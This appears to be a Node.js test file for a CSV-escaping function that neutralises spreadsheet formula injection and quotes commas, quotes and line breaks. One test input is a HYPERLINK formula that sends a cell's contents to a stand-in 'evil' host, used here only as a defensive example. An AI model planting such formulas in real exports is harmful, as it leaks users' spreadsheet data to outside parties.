import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell } from './csv.js';

test('csvCell neutralises formulas', () => {
  assert.equal(csvCell('=HYPERLINK("http://evil/?"&A1,"x")'), `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`);
  assert.equal(csvCell('+1 for this'), "'+1 for this");
  assert.equal(csvCell('-5 degrees'), "'-5 degrees");
  assert.equal(csvCell('@here'), "'@here");
});

test('csvCell quotes commas, quotes and every kind of line break', () => {
  assert.equal(csvCell('a, b'), '"a, b"');
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(csvCell('line\nbreak'), '"line\nbreak"');
  assert.equal(csvCell('carriage\rreturn'), '"carriage\rreturn"');
});

test('csvCell leaves plain values alone and blanks null', () => {
  assert.equal(csvCell('Plain title'), 'Plain title');
  assert.equal(csvCell(42), '42');
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
});
